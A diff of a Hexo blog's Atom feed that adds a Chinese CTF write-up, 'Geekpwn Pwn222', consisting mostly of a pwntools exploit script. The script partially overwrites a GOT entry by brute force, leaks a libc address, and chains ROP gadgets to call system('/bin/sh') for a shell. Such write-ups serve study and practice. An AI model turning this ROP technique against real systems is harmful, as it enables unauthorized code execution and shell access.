@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2020-11-26T04:13:56.102Z</updated>
+  <updated>2020-11-26T10:17:48.891Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,12 +17,39 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Geekpwn Pwn222</title>
+    <link href="http://example.com/2020/11/26/GeekPwn-pwn222/"/>
+    <id>http://example.com/2020/11/26/GeekPwn-pwn222/</id>
+    <published>2020-11-26T10:17:48.000Z</published>
+    <updated>2020-11-26T10:17:48.891Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>无输出函数，尝试使用__do_global_dtors_aux时发现在栈上并没有残留的地址。</p><p>由于read()函数为该程序唯一输入程序，不考虑对其下手。剩下有realpath()函数和setvbuf()函数，realpath()函数为比较高级的函数，其附近的函数不好利用，而根据提供的libc库文件发现setvbuf()函数距离puts()函数非常的近，考虑用read()函数构造ROP修改setvbuf()got表的后两位，将其修改为puts()函数，由于修改了倒数第二位，所以每次只有1/16的几率修改成功。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># r=remote(&#x27;81.69.0.47&#x27;,2212)</span></span><br><span class="line">        r=process(<span class="string">&#x27;./pwn222&#x27;</span>)</span><br><span class="line">        elf = ELF(<span class="string">&#x27;./pwn222&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc&#x27;</span>)</span><br><span class="line">        rdi = <span class="number">0x401233</span></span><br><span class="line">        rsir15 = <span class="number">0x401231</span></span><br><span class="line">        leave = <span class="number">0x4011aa</span></span><br><span class="line">        bss = <span class="number">0x404500</span></span><br><span class="line">        setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">        read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        fake_puts = elf.symbols[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">        read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(setvbuf_got)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#r.sendline(cyclic(32)+p64(bss-8)+p64(rdi)+p64(0)+p64(rsir15)+p64(setvbuf_got)+p64(0))</span></span><br><span class="line">        make_puts = p64(rdi)+p64(<span class="number">0</span>)+p64(rsir15)+p64(setvbuf_got)+p64(<span class="number">0</span>)+p64(read)</span><br><span class="line">        leak_read = p64(rdi)+p64(read_got)+p64(fake_puts)</span><br><span class="line">        move_stack = p64(rdi)+p64(<span class="number">0</span>)+p64(rsir15)+p64(bss)+p64(<span class="number">0</span>)+p64(read)+p64(leave)</span><br><span class="line">        exp = make_puts + leak_read + move_stack</span><br><span class="line"></span><br><span class="line">        r.sendline(cyclic(<span class="number">32</span>)+p64(bss-<span class="number">8</span>)+exp)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        r.send(p16(<span class="number">0xf6a0</span>))</span><br><span class="line">        libc_addr = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        system = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        r.sendline(p64(rdi)+p64(binsh)+p64(system))</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>myblog</title>
     <link href="http://example.com/2020/11/26/myblog/"/>
     <id>http://example.com/2020/11/26/myblog/</id>
     <published>2020-11-26T03:57:41.000Z</published>
     <updated>2020-11-26T04:13:56.102Z</updated>
     
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
     
     
     
